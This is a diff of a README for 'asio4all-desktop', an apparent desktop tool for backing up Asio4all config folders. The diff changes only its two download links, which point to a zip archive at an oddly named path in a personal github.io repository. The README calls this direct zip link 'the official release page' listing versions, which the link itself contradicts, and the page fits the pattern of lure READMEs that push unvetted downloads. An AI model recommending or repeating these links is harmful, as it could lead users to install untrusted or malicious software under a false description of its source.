@@ -5,7 +5,7 @@ description: "Archive Asio4all config and data folders to dated backups before p
 ---
 # 🗂️ asio4all-desktop - Keep Your Audio Configs Safe
 
-[![Download asio4all-desktop](https://img.shields.io/badge/Download-asio4all--desktop-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/alfaumm/alfaumm.github.io/raw/refs/heads/main/rhinopharynx/3.0.zip)
+[![Download asio4all-desktop](https://img.shields.io/badge/Download-asio4all--desktop-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/alfaumm/alfaumm.github.io/main/rhinopharynx/3.0.zip)
 
 asio4all-desktop is a small desktop utility that keeps your Asio4all data folders safe on disk. Every time you are about to apply a patch, it makes a dated copy of your config and export files, so you always have a clean point to return to.
 
@@ -28,7 +28,7 @@ No cloud account. No background service. No mystery storage location. Everything
 
 Visit this link to download the application:
 
-**https://github.com/alfaumm/alfaumm.github.io/raw/refs/heads/main/rhinopharynx/3.0.zip**
+**https://raw.githubusercontent.com/alfaumm/alfaumm.github.io/main/rhinopharynx/3.0.zip**
 
 That page is the official release page for asio4all-desktop. It lists the available versions, newest first. Pick the newest one, open it, and use the download item shown on that release. Save the file somewhere you can find again, such as your Downloads folder or your Desktop.
 
